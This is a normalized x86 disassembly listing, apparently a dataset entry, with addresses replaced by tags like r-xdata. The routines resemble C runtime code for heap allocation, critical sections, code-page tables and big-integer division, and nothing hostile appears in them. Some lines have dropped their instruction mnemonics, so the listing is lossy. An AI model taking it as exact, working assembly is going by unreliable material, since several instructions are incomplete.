mov [ esi + edi ] eax
jne r-xdata
lea eax [ ebp - 0x2b8 ]
push eax
call sub_418137
pop ecx
mov ecx [ ebp - 0x2bc ]
mov [ edi + ebx * 4 + 0xa0 ] eax
cmp [ ebp - 0x10a ] 0x0
jne r-xdata
cmp ebx 0x1
jne r-xdata
mov esi [ ebp - 0x2d4 ]
mov edx ecx
mov eax [ ebp - 0x2c0 ]
mov ecx esi
mov [ edi + 0x8 ] eax
mov [ ebp - 0x2c4 ] esi
mov eax [ esi + 0x20 ]
mov [ ebp - 0x2cc ] eax
mov eax [ esi + 0x24 ]
mov [ ebp - 0x2c0 ] eax
mov ecx [ ebp - 0x2bc ]
mov [ edi + ebx * 4 + 0xa0 ] ecx
jmp r-xdata
cmp ebx 0x5
jne r-xdata
mov eax [ ebp - 0x2c0 ]
mov [ edi + 0x10 ] eax
jmp r-xdata
test edx edx
je r-xdata
mov esi [ ebp - 0x2c4 ]
inc edx
mov eax [ ecx ]
mov ebx [ ebp - 0x2cc ]
mov ecx [ ecx + 0x4 ]
mov [ esi ] ebx
mov ebx [ ebp - 0x2c0 ]
mov [ ebp - 0x2c0 ] ecx
mov ecx esi
add ecx 0x8
mov [ esi + 0x4 ] ebx
mov ebx [ ebp - 0x2e4 ]
mov esi [ ebp - 0x2d4 ]
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x2c4 ] ecx
cmp edx 0x5
jl r-xdata
cmp ebx 0x2
jne r-xdata
imul eax ebx 0xc
push edi
mov esi [ eax + r--data ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
mov ecx [ ebp - 0x2d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2c0 ]
mov [ edi + 0x14 ] eax
cmp edx 0x5
jne r-xdata
mov eax [ esi + edx * 8 ]
mov [ esi ] eax
mov eax [ esi + edx * 8 + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x2cc ]
mov [ esi + edx * 8 ] eax
mov eax [ ebp - 0x2c0 ]
mov [ esi + edx * 8 + 0x4 ] eax
mov eax [ edi + 0x8 ]
cmp eax [ ecx ]
je r-xdata
jmp r-xdata
cmp ecx rw-data
je r-xdata
mov eax [ ebp - 0x2c8 ]
mov [ eax + edi ] ecx
push [ edi + ebx * 4 + 0xa0 ]
call sub_41a3a5
mov ecx [ ebp - 0x2d8 ]
mov eax [ ebp - 0x2dc ]
push ecx
mov [ edi + ebx * 4 + 0xa0 ] eax
call sub_41a3a5
mov eax [ ebp - 0x2e0 ]
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x18 ] eax
jmp r-xdata
push 0x1
push [ edi + 0x8 ]
lea eax [ ebp - 0x20c ]
push eax
push 0x7f
push r--data
push 0x1
push [ ebp - 0x2bc ]
call sub_42082a
add esp 0x1c
test eax eax
mov eax [ ebp - 0x2bc ]
je r-xdata
mov eax [ ebp - 0x2c8 ]
mov esi ebx
or ecx 0xffffffff
add esi esi
mov eax [ edi + esi * 8 + 0x28 ]
[ eax ] ecx
jne r-xdata
mov [ esi + 0x4 ] eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x20c ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push [ edi + esi * 8 + 0x28 ]
call sub_41a3a5
push [ edi + esi * 8 + 0x24 ]
call sub_41a3a5
push [ edi + ebx * 4 + 0xa0 ]
call sub_41a3a5
mov eax [ ebp - 0x2c8 ]
add esp 0xc
mov ecx [ ebp - 0x2bc ]
mov [ eax + edi ] ecx
mov [ edi + ebx * 4 + 0xa0 ] ecx
jmp r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x20c ]
push eax
call sub_411d14
xor ecx ecx
add esp 0xc
test eax eax
sete cl
mov [ esi + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x2d8 ]
add ebx ebx
mov [ ecx ] 0x1
mov eax [ eax + edi ]
mov [ edi + ebx * 8 + 0x28 ] ecx
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ esi ] eax
sub_4190b2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx rw-data
xchg [ ecx ] eax
pop ebp
retn
cmp eax 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
pop ebp
retn
sub_4190e7
push 0xc
push r--data
call sub_429a90
call sub_41aa93
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
call sub_419afb
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_419123
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
and ecx 0xfff7ffff
and eax ecx
push esi
mov esi [ ebp + 0x8 ]
test eax 0xfcf0fce0
je r-xdata
push ecx
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_42209e
call sub_42209e
mov [ esi ] eax
jmp r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_42209e
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_419182
mov edi edi
push esi
push edi
mov edi rw-data
xor esi esi
push 0x0
call sub_4191da
pop ecx
xor al al
inc [ rw-data ]
add esi 0x18
add edi 0x18
cmp esi 0x138
jb r-xdata
push 0x0
push 0xfa0
push edi
call sub_41c164
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_4191da
mov edi edi
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
imul eax esi 0x18
push edi
lea edi [ eax + rw-data ]
push edi
call [ DeleteCriticalSection@IAT ]
dec [ rw-data ]
sub edi 0x18
sub esi 0x1
jne r-xdata
pop edi
sub_419234
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push esi
push edi
push 0x7fffffff
push [ ebp + 0xc ]
xor edi edi
lea eax [ ebp - 0x4 ]
push edi
push edi
push eax
call sub_422695
add esp 0x14
test eax eax
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4187e2
pop ecx
pop ecx
jmp r-xdata
push 0x2
push [ ebp - 0x4 ]
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
cmp eax 0x16
je r-xdata
mov esp ebp
pop ebp
retn
push esi
call sub_41a3a5
pop ecx
mov eax edi
pop edi
pop esi
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push esi
push edi
call sub_422695
add esp 0x14
test eax eax
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413b2e
int3
cmp eax 0x22
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_4187e2
pop ecx
pop ecx
mov edi eax
cmp eax 0x16
je r-xdata
cmp eax 0x22
jne r-xdata
jmp r-xdata
sub_4192d1
push 0x1c
push r--data
call sub_40e2a0
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push esi
call sub_419234
pop ecx
pop ecx
mov edi eax
test edi edi
jne r-xdata
call sub_41aa93
mov [ ebp - 0x24 ] eax
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x2c ] ecx
mov ecx [ eax + 0x48 ]
mov [ ebp - 0x28 ] ecx
xor ebx ebx
mov [ ebp - 0x1c ] ebx
lea eax [ ebp - 0x2c ]
push eax
push ebx
push edi
push ebx
push ebx
lea eax [ ebp - 0x1c ]
push eax
call sub_422936
add esp 0x18
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x4
push eax
call sub_419b3e
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
cmp eax 0x16
je r-xdata
call sub_40e2e6
retn
lea eax [ ebx + 0x4 ]
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x2c ]
push ecx
push 0xffffffff
push edi
push [ ebp - 0x1c ]
push eax
xor edi edi
push edi
call sub_422936
add esp 0x18
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
cmp eax 0x22
jne r-xdata
mov edi [ ebp - 0x2c ]
push 0x4
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
add esi esi
mov edx [ edi + esi * 8 + 0x24 ]
or ecx 0xffffffff
test edx edx
je r-xdata
cmp eax 0x16
je r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
test [ eax + 0x350 ] 0x2
jne r-xdata
mov eax ecx
[ edx ] eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
jmp r-xdata
cmp eax 0x22
jne r-xdata
mov eax [ edi + 0xc ]
mov [ ebx ] eax
mov [ edi + esi * 8 + 0x24 ] ebx
mov ebx [ ebp - 0x20 ]
mov [ edi + esi * 8 + 0x1c ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419425
mov eax ebx
test [ rw-data ] 0x1
jne r-xdata
push [ edi + esi * 8 + 0x24 ]
call sub_41a3a5
pop ecx
and [ edi + esi * 8 + 0x24 ] 0x0
or ecx 0xffffffff
call sub_413b2e
test eax eax
je r-xdata
mov eax [ edi + esi * 8 + 0x24 ]
test eax eax
je r-xdata
push ebx
call sub_41a3a5
pop ecx
jmp r-xdata
[ eax ] ecx
dec ecx
jne r-xdata
push [ edi + esi * 8 + 0x24 ]
call sub_41a3a5
pop ecx
and [ edi + esi * 8 + 0x24 ] 0x0
sub_41942e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jb r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
call sub_41529e
mov [ eax ] 0xc
xor eax eax
call sub_4190ac
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_416f7e
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
sub_41948b
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_41aa93
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_41ae60
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax ]
mov esp ebp
pop ebp
retn
sub_4194b1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_414048
lea eax [ ebp - 0xc ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_41606f
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_4194e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_414048
lea eax [ ebp - 0xc ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_41606f
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_419521
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_414048
lea eax [ ebp - 0xc ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_41606f
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_419559
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4194b1
pop ecx
pop ecx
pop ebp
retn
sub_419586
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4194e9
pop ecx
pop ecx
pop ebp
retn
sub_4195b3
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_419521
pop ecx
pop ecx
pop ebp
retn
sub_4195e0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
xor edi edi
lea edx [ ecx + 0x2 ]
xor eax eax
pop ebp
retn
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx edx
sar ecx 0x1
push ebx
lea ebx [ ecx + 0x1 ]
lea eax [ ebx + ebx ]
push eax
call sub_413b61
mov edi eax
pop ecx
test edi edi
jne r-xdata
push [ ebp + 0x8 ]
push ebx
push edi
call sub_41a3df
add esp 0xc
test eax eax
jne r-xdata
pop ebx
pop edi
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
mov eax edi
jmp r-xdata
sub_419641
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_41aa93
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_41ae60
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
sub_419668
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_41aa93
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_41ae60
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
add eax 0xa0
mov esp ebp
pop ebp
retn
sub_419691
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x1c ] ebx
mov ecx [ esi + 0xa8 ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x44 ] ebx
test ecx ecx
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] ebx
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0x8c ] ebx
xor eax eax
mov [ esi + 0x90 ] ebx
mov [ esi ] r--data
mov [ esi + 0x94 ] r--data
mov [ esi + 0x98 ] r--data
mov [ esi + 0x4 ] 0x1
[ eax ]
push 0x4
push 0x1
call sub_41942e
push ebx
mov [ ebp - 0x28 ] eax
call sub_41a3a5
push 0x2
mov edi 0x180
push edi
call sub_41942e
push ebx
mov [ ebp - 0x1c ] eax
call sub_41a3a5
push 0x1
push edi
call sub_41942e
push ebx
mov [ ebp - 0x20 ] eax
call sub_41a3a5
push 0x1
push edi
call sub_41942e
push ebx
mov [ ebp - 0x24 ] eax
call sub_41a3a5
push 0x1
push 0x101
call sub_41942e
mov edi eax
push ebx
mov [ ebp - 0x30 ] edi
call sub_41a3a5
add esp 0x3c
cmp [ ebp - 0x28 ] ebx
je r-xdata
push eax
push 0x1004
push ecx
lea eax [ ebp - 0x48 ]
push ebx
push eax
call sub_422afe
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x28 ]
call sub_41a3a5
push [ ebp - 0x1c ]
call sub_41a3a5
push [ ebp - 0x20 ]
call sub_41a3a5
push [ ebp - 0x24 ]
call sub_41a3a5
xor ebx ebx
add esp 0x10
inc ebx
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
mov eax ebx
mov [ eax + edi ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x8 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax 0x5
ja r-xdata
push ebx
push [ esi + 0x8 ]
movzx eax ax
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x2c ] eax
mov edx 0xff
mov eax [ ebp - 0x20 ]
push edx
add eax 0x81
push eax
push edx
push ecx
push 0x100
push [ esi + 0xa8 ]
push ebx
call sub_41e073
add esp 0x24
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx 0xff
push ebx
push [ esi + 0x8 ]
add eax 0x81
push ecx
push eax
push ecx
lea eax [ edi + 0x1 ]
push eax
push 0x200
push [ esi + 0xa8 ]
push ebx
call sub_41e073
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x2c ] 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push [ esi + 0x8 ]
add eax 0x100
push eax
push 0x100
push edi
push 0x1
push ebx
mov [ ebp - 0x38 ] eax
call sub_42082a
add esp 0x1c
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov edx [ ebp - 0x1c ]
xor ecx ecx
lea eax [ edx + 0xfe ]
mov [ eax ] cx
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
mov [ ecx + 0x7f ] bl
sub ecx 0xffffff80
cmp [ ebp - 0x2c ] 0x1
mov [ eax + 0x7f ] bl
mov [ ebp - 0x40 ] ecx
mov [ ecx ] bl
lea ecx [ eax + 0x80 ]
mov [ ebp - 0x34 ] ecx
mov [ ecx ] bl
jle r-xdata
lea ecx [ ebp - 0x11 ]
push 0x3f
pop ecx
lea esi [ edx + 0x200 ]
mov edi edx
[ edi ] [ esi ]
mov edx [ ebp - 0x20 ]
push 0x1f
pop ecx
movsw [ edi ] [ esi ]
lea esi [ edx + 0x100 ]
mov edi edx
[ edi ] [ esi ]
push 0x1f
pop ecx
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea esi [ eax + 0x100 ]
mov edi eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi [ ebp - 0x3c ]
mov ecx [ esi + 0x8c ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
movzx edx [ ecx - 0x1 ]
movzx eax al
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ eax ] 0x1
mov [ esi + 0x8c ] eax
mov eax [ ebp - 0x38 ]
mov [ esi ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x90 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0x94 ] eax
mov eax [ ebp - 0x34 ]
mov [ esi + 0x98 ] eax
mov eax [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
jmp r-xdata
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
cmp edx eax
jle r-xdata
push [ ebp - 0x30 ]
call sub_41a3a5
pop ecx
mov eax ebx
jmp r-xdata
mov eax [ esi + 0x90 ]
sub eax 0xfe
push eax
call sub_41a3a5
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_41a3a5
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_41a3a5
push [ esi + 0x8c ]
call sub_41a3a5
add esp 0x10
mov eax [ ebp - 0x24 ]
movzx esi [ ecx - 0x1 ]
movzx eax al
cmp esi eax
jg r-xdata
mov [ edx + edi ] 0x20
inc edx
movzx eax [ ecx ]
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea edi [ edx + 0x100 ]
lea edi [ edi + esi * 2 ]
mov al [ ecx ]
test al al
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov eax 0x8000
inc esi
mov [ edi ] ax
lea edi [ edi + 0x2 ]
movzx eax [ ecx ]
cmp esi eax
jle r-xdata
sub_419a2f
push 0x10
push r--data
call sub_40e2a0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
setne al
test eax eax
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor eax eax
cmp [ edi ] al
setne al
test eax eax
je r-xdata
call sub_40e2e6
retn
cmp [ esi ] 0x0
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_41dcc0
pop ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
jmp r-xdata
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_42305a
add esp 0x10
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419ad9
mov eax esi
call sub_41529e
mov [ eax ] 0x18
jmp r-xdata
xor eax eax
jmp r-xdata
sub_419afb
call sub_41f422
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_41f47d
pop ecx
push 0x3
call sub_4151bc
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_413937
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_419b3e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
call sub_41529e
mov [ eax ] 0xc
xor eax eax
test esi esi
jne r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
call sub_4190ac
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_416f7e
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
sub_419b8c
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_419b3e
pop ecx
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
push edi
call sub_41a3a5
pop ecx
jmp r-xdata
pop edi
pop ebp
retn
push esi
push edi
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
test eax eax
je r-xdata
call sub_41529e
mov [ eax ] 0xc
xor eax eax
call sub_4190ac
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_416f7e
pop ecx
test eax eax
je r-xdata
pop esi
sub_419c00
mov edi edi
push ebp
mov ebp esp
sub esp 0x21c
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
test eax eax
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
test ecx ecx
jne r-xdata
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ eax - 0x1 ]
lea eax [ ecx - 0x1 ]
mov [ ebp - 0xc ] esi
test eax eax
jne r-xdata
pop edi
xor eax eax
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx 0x1
jne r-xdata
pop esi
pop edi
xor eax eax
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
lea ecx [ eax + 0x1 ]
sub edx eax
mov [ ebp - 0x38 ] ecx
mov ecx esi
cmp esi edx
jl r-xdata
test esi esi
jne r-xdata
mov esi [ ebx + 0x4 ]
lea ecx [ ebx + 0x4 ]
push eax
mov [ ebp - 0x21c ] eax
mov [ ebx ] eax
lea eax [ ebp - 0x218 ]
push eax
push 0x1cc
push ecx
call sub_41ed6e
add esp 0x10
mov eax esi
xor edx edx
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov eax ecx
inc esi
sub eax edx
lea esi [ ebx + esi * 4 ]
lea edi [ edi + eax * 4 ]
add edi 0x4
xor edi edi
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edi
cmp esi 0xffffffff
je r-xdata
mov esi [ ebx + 0x4 ]
lea eax [ ebp - 0x218 ]
push 0x0
push eax
lea edi [ ebx + 0x4 ]
mov [ ebp - 0x21c ] 0x0
push 0x1cc
push edi
mov [ ebx ] 0x0
call sub_41ed6e
xor edx edx
mov eax esi
div [ ebp - 0x28 ]
add esp 0x10
xor ecx ecx
cmp ecx edx
mov [ edi ] edx
sbb ecx ecx
pop esi
neg ecx
xor edx edx
pop edi
mov [ ebx ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x38 ]
mov eax [ ebp + 0xc ]
mov esi [ eax + edi * 4 ]
mov eax [ eax + edi * 4 - 0x4 ]
mov [ ebp - 0x20 ] eax
bsr eax esi
mov [ ebp - 0x34 ] esi
je r-xdata
mov esi [ ebp + 0xc ]
mov eax ecx
sub eax edx
mov eax [ esi + eax * 4 + 0x4 ]
cmp eax [ ebx + ecx * 4 + 0x4 ]
jae r-xdata
dec ecx
sub edi 0x4
sub esi 0x4
cmp ecx edx
jge r-xdata
push 0x0
lea eax [ ebp - 0x218 ]
mov [ ebp - 0x21c ] 0x0
push eax
lea esi [ ebx + 0x4 ]
mov [ ebx ] 0x0
push 0x1cc
push esi
call sub_41ed6e
mov eax [ ebp - 0x10 ]
add esp 0x10
mov edx [ ebp - 0x4 ]
xor ecx ecx
cmp ecx eax
mov [ esi ] edi
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x8 ]
sbb ecx ecx
neg ecx
pop esi
inc ecx
pop edi
mov [ ebx ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
inc esi
inc eax
mov [ ebp - 0x1c ] eax
lea esi [ ebx + esi * 4 ]
lea esp [ esp ]
mov ecx 0x20
mov ecx 0x1f
sub ecx eax
jmp r-xdata
test edx edx
jne r-xdata
mov eax [ edi ]
cmp eax [ esi ]
jne r-xdata
jmp r-xdata
push 0x0
push ecx
xor eax eax
or eax [ esi ]
push edi
push eax
call sub_4299f0
mov [ ebp - 0x40 ] edx
lea esi [ esi - 0x4 ]
xor edx edx
mov [ ebp - 0x10 ] ebx
mov edi ecx
add edx eax
mov ecx [ ebp - 0x8 ]
adc ecx 0x0
mov [ ebp - 0x8 ] edx
sub [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x28 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x48 ] 0x0
add edx 0xffffffff
mov [ ebp - 0x1c ] edx
js r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x3c ]
shr eax cl
mov ecx [ ebp - 0x24 ]
shl [ ebp - 0x20 ] cl
shl esi cl
or esi eax
mov [ ebp - 0x34 ] esi
cmp edi 0x2
jbe r-xdata
mov eax 0x20
mov [ ebp - 0x24 ] ecx
sub eax ecx
mov [ ebp - 0x3c ] eax
test ecx ecx
je r-xdata
xor edi edi
lea ecx [ ebx + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ ebp - 0x10 ] ecx
lea eax [ edx + edi ]
lea ecx [ ebx - 0x4 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ecx + eax * 4 ]
mov [ ebp - 0x4c ] ecx
mov esi [ ebp + 0xc ]
mov ecx [ ebp - 0x3c ]
mov eax [ esi + edi * 4 - 0x8 ]
shr eax cl
or [ ebp - 0x20 ] eax
mov [ ebx ] edx
test edx edx
je r-xdata
lea ecx [ eax + 0x1 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
jmp r-xdata
mov edx esi
mov eax edi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx ]
cmp [ ebx + ecx * 4 ] 0x0
jne r-xdata
mov [ ecx ] 0x0
lea ecx [ ecx + 0x4 ]
inc eax
cmp eax [ ebx ]
jb r-xdata
push 0x0
push [ ebp - 0x34 ]
push eax
push edx
call sub_4299f0
mov [ ebp - 0x28 ] ebx
xor esi esi
mov ebx eax
mov [ ebp - 0x28 ] esi
mov eax edx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] eax
mov edi ecx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] eax
test eax eax
jne r-xdata
mov edi ecx
mov eax edx
mov ecx [ ebp - 0x3c ]
xor esi esi
mov edx [ ebp - 0x4 ]
shr edi cl
mov ecx [ ebp - 0x24 ]
call sub_429af0
mov ecx [ ebp - 0x24 ]
or esi edx
or edi eax
mov eax esi
mov esi [ ebp - 0x14 ]
mov edx edi
shl esi cl
cmp [ ebp - 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
